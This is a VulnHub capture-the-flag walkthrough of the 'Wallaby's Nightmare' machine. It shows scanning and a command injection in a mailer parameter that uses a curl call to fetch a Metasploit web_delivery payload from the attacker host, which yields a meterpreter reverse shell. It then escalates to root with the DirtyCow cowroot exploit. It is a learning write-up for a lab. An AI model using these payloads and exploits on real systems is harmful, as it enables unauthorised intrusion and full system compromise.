# 🧠 Wallaby's Nightmare – VulnHub CTF Walkthrough

**Author:** Shah Zaman  
**Platform:** VulnHub  
**Difficulty:** Intermediate  
**Target IP:** 10.0.2.4  
**Attacker Machine:** Kali Linux  
**Objective:** Exploit command injection, gain root, capture the flag  
**Tools Used:** Netdiscover, Nmap, Nikto, Dirb, Metasploit, Python, GCC

---

## 📌 Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Scanning & Enumeration](#2-scanning--enumeration)
3. [Vulnerability Discovery](#3-vulnerability-discovery)
4. [Exploitation (Command Injection)](#4-exploitation-command-injection)
5. [Post-Exploitation & Privilege Escalation](#5-post-exploitation--privilege-escalation)
6. [Flag Capture](#6-flag-capture)
7. [Summary & Lessons Learned](#7-summary--lessons-learned)
8. [References](#references)

---

## 1. 🔍 Reconnaissance

### 🔹 Discover Target IP using Netdiscover
```bash
netdiscover -r 10.0.2.0/24
```
**Output:**
10.0.2.4     08:00:27:c3:33:5c     1     60   (Wallaby's Nightmare)

---

## 2. 🧪 Scanning & Enumeration

### 🔹 Basic Nmap Scan

```bash
nmap -sS -T4 -p- 10.0.2.4
```

**Output:**
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http

### 🔹 Service Version Detection
```bash
nmap -sC -sV -A -oN nmap.txt 10.0.2.4
```
**Output:**
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1
80/tcp open  http    Apache/2.4.7 (Ubuntu)

---

## 3. 🔍 Vulnerability Discovery
### 🔹 Web Directory Scan with Dirb
```bash
dirb http://10.0.2.4
```
**Output:**
---- Scanning URL: http://10.0.2.4/ ----
==> Found: /mailer/

### 🔹 Check /mailer Page for Parameters
_Manually Visit:_
http://10.0.2.4/?page=mailer&mail=php
Suspicious parameter usage → Possible Command Injection.

---

## 4. 💥 Exploitation (Command Injection)

### 🔹 Use Metasploit’s web_delivery Module

```bash
msfconsole
use exploit/multi/script/web_delivery
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <your-kali-ip>
set SRVPORT 8080
exploit
```

**Metasploit Output:**
[*] Server started.
[*] PHP payload command ready to be injected.

### 🔹 Inject Payload via URL

_Go to browser:_
http://10.0.2.4/?page=mailer&mail=<?php system('curl http://<kali_ip>:8080/script'); ?>

💡 Or run in terminal using curl or wget.
✅ Meterpreter session opens!

---

## 5. 🔐 Post-Exploitation & Privilege Escalation
### 🔹 Upgrade to a Bash Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
### 🔹 Confirm Current User
```bash
whoami
```
**Output:**
www-data

### 🔹 Try Privilege Escalation via DirtyCow (cowroot)

_🔹 Download Exploit_
```bash
wget https://github.com/FireFart/dirtycow/raw/master/cowroot.c
```
_Compile and Run_
```bash
gcc cowroot.c -o cowroot
chmod +x cowroot
./cowroot
```

✅ Gained root shell!

---

## 6. 🏁 Flag Capture

### 🔹 View Root Files
```bash
cd /root
ls
cat flag.txt
```

_🎉 Root access achieved and flag captured!_

---
## 7. 📚 Summary & Lessons Learned
* Discovered command injection vulnerability in /mailer
* Used Metasploit web_delivery to deliver PHP Meterpreter payload
* Successfully exploited with reverse shell
* Privilege escalated using DirtyCow kernel vulnerability
* Completed full system compromise

---

## 🔗 References

- [Hacking Articles – Wallaby’s Nightmare Walkthrough](https://www.hackingarticles.in/hack-nightmare-vm-ctf-challenge/)
- [Abatchy’s VulnHub Walkthrough](https://www.abatchy.com/2017/01/wallabys-nightmare-walkthrough-vulnhub)
- [YouTube – Full Video Walkthrough](https://youtu.be/eNcUzBwR2wM?si=tMROByH3kPVrvgpZ)

---

> 🛡️ This walkthrough is part of my hands-on cybersecurity learning journey. Feedback is always welcome!
